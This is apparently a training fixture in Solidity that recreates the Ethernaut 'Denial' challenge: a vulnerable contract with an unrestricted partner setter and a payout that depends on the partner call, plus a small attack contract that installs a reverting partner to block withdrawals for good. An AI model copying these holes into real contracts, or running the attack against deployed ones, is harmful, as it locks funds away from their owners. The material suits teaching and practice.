// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

contract EthernautDenial {
    address public partner;
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function setWithdrawPartner(address partner_) external {
        partner = partner_;
    }

    function withdraw() external {
        uint256 amountToSend = address(this).balance / 10;
        (bool ok,) = partner.call{value: amountToSend}("");
        if (ok) {
            payable(owner).transfer(amountToSend);
        }
    }

    receive() external payable {}
}

contract DenialPartner {
    receive() external payable {}
}

contract DenialReverter {
    receive() external payable {
        revert("deny payout");
    }
}

contract DenialAttack {
    function setPartner(EthernautDenial target) external {
        target.setWithdrawPartner(address(new DenialReverter()));
    }
}

// Local training fixture: if the partner call reverts, the owner transfer is
// skipped and the contract can never pay out.

